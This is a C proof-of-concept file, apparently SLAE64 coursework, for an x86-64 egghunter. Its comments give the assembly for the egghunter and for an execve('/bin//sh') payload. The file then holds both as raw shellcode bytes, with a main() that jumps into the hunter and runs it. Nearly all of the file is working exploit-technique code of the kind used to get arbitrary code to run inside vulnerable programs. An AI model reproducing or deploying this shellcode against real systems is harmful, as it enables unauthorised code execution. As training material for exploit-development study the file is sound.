// Andrea Bruna SLAE64 - 1493
// Proof of Concept of a "Egghunter" assembly routine to find a shellcode stred somewhere in the stack 

#include <stdio.h>
#include <string.h>


/* The egghunter code */

//global _start
//
//section .text
//
//_start:
//
//	push rsp ; push the stack address in the stack
//	mov ebx,0xfcfdfcfd ; move the high 4 bytes of the EGG in ebx
//	mov eax,ebx ; eax = EGG
//	shl rax,32 ; rax = 0xfcfdfcfd00000000
//	add rax,rbx ; rax = 0xfcfdfcfdfcfdfcfd
//	xor rcx,rcx ; clear rcx
//	pop rcx ; load the stack address in rcx
//loop:	
//	inc rcx ; increase rcx 
//	push rcx ; push rcx in the stack
//	pop rdi ; load it in rdi
//	scasq ; compare the memory pointed to scasq with rax
//	jnz loop ; jump if not equal
//	jmp rdi ; "EGGEGG" found jump 



/* The sample Payload */

//global _start
//
//section .text
//
//_start:
//
//	xor rsi,rsi ; clear rax
//	push rsi ; and push it in the stack to terminate the following string with 0

//	mov rbx, 0x68732f2f6e69622f ; "/bin//sh" in reverse order
//	push rbx ; string pushed in the stack

//	mov rdi, rsp ; save the address of the command "/bin//sh"" in rdi

//	imul rsi ; rsi, rax and edx = 0

//	add al,59
//	syscall
// 



#define EGG "\xfd\xfc\xfd\xfc"

/* the egghunter code, search the stack for two consecutive occurences of the string defined as EGG 
*/
unsigned char egghunter[] = \
"\x54\xbb"
EGG
"\x89\xd8\x48\xc1\xe0\x20\x48\x01\xd8\x48\x31\xc9\x59\x48\xff\xc1\x51\x5f\x48\xaf\x75\xf7\xff\xe7";	     



int main(){

/* This is the actual shellcode comprising some junk, the EGGEGG string and a payload (a standard execve("/bin//sh", 0,0)) */
/* The shellcode is defined as an array in "main" to make sure it's correctly loaded in the stack */
/* The payload could obviously be customized. In a real world scenario the shorter, the better */

unsigned char shellcode[] = "Andrea was here" 
EGG EGG
"\x48\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\xf7\xee\x04\x3b\x0f\x05";

	printf("EggHunter length: %d\n", strlen(egghunter));
	printf("Shellcode length: %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())egghunter;
	ret();
}
